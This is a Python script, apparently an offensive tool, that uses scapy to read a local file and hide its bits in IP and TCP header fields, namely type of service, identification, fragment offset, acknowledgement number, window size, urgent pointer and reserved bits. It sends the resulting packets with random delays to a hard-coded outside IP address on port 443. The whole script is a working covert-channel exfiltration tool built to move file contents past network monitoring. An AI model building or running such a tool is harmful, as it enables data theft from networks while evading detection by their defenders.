from scapy.all import *
from scapy.arch.windows import get_windows_if_list
import random
import time
import pandas as pd


class PacketField:
    def __init__(self, bits):
        self.bits = bits

    def calculate_value(self, bit_array):
        value = 0
        for bit in self.bits:
            value = (value << 1) + int(bit_array.pop(0))
        return value


def read_file_to_bit_array(filepath):
    with open(filepath, 'rb') as file:
        content = file.read()
    bit_array = []
    for byte in content:
        bit_array.extend(format(byte, '08b'))
    return bit_array


def generate_packet(bit_array, dst_addr, src_addr):

    # Documentation about scapy definitions of proto fields in
    # https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html

    ip_length = PacketField([1, 1, 1, 1, 1]).calculate_value(bit_array)  # IP/Length
    tos = PacketField([1, 1, 1, 1, 1, 1, 1, 1]).calculate_value(bit_array)  # IP/TOS
    ident = PacketField([1 for _ in range(16)]).calculate_value(bit_array)  # IP/Identification
    frag = PacketField([1 for _ in range(13)]).calculate_value(bit_array)  # IP/Fragment Offset
    ack = PacketField([1 for _ in range(32)]).calculate_value(bit_array)  # TCP/Acknowledgement
    wind = PacketField([1 for _ in range(16)]).calculate_value(bit_array)  # TCP/Window Size
    urg = PacketField([1 for _ in range(16)]).calculate_value(bit_array)  # TCP/Urgent Pointer
    res = PacketField([1, 1, 1]).calculate_value(bit_array)  # TCP/Reserved

    src_port = random.randint(50201, 65534)
    dst_port = 443
    # default_udp_len =
    ip_field_dict = [
        {'len': ip_length},
        {'tos': tos},
        {'id': ident},
        {'frag': frag}
    ]
    tcp_field_dict = [
        {'ack': ack},
        {'window': wind},
        {'urgptr': urg},
        {'reserved': res}
    ]

    packets = []

    for args in ip_field_dict:
        if "len" in args:
            pkt_var_1 = IP(src=src_addr, dst=dst_addr, **args) / UDP(sport=src_port, dport=dst_port, len=ip_length)
        else:
            pkt_var_1 = IP(src=src_addr, dst=dst_addr, **args) / UDP(sport=src_port, dport=dst_port, len=8)
        packets.append(pkt_var_1)

    for args in tcp_field_dict:
        pkt_var_2 = IP(src=src_addr, dst=dst_addr) / TCP(sport=src_port, dport=dst_port, flags="AU", **args)
        packets.append(pkt_var_2)

    pkt_full = IP(src=src_addr, dst=dst_addr, len=ip_length, tos=tos, id=ident, frag=frag) / \
               TCP(sport=src_port, dport=dst_port, ack=ack, urgptr=urg, window=wind, flags="AU", reserved=res)
    packets.append(pkt_full)

    pkt = random.choice(packets)

    return pkt


def iface_ip_detect():
    global iface_ip, detected_real_iface
    interfaces = pd.DataFrame(get_windows_if_list())
    iface_filter = interfaces['ipv4_metric'] != 0
    interfaces = pd.DataFrame(interfaces[iface_filter])
    df = interfaces[['name']]
    iface_list = df['name'].tolist()
    # print("Available interfaces:")
    i = 1
    for iface in iface_list:
        # print(" ",i,iface)
        i = i + 1
        if "ethernet" in iface.lower():
            iface_ip = get_if_addr(iface)
            detected_real_iface = iface
    print(f"Detected iface is:", detected_real_iface)
    print(f"IP address of {detected_real_iface}: {iface_ip}")
    return iface_ip


def main():
    # Configure program
    source_address = iface_ip_detect()
    dest_address = "91.197.194.73"
    path_to_txt_file = r'C:\Users\Nikita\Desktop\111.txt'
    bit_array = read_file_to_bit_array(path_to_txt_file)
    cnt = 0
    while len(bit_array) > 0:
        pkt = generate_packet(bit_array, dest_address, source_address)
        time.sleep(random.uniform(0.05, 0.10))
        send(pkt)
        cnt += 1
        print(cnt)


if __name__ == "__main__":
    main()
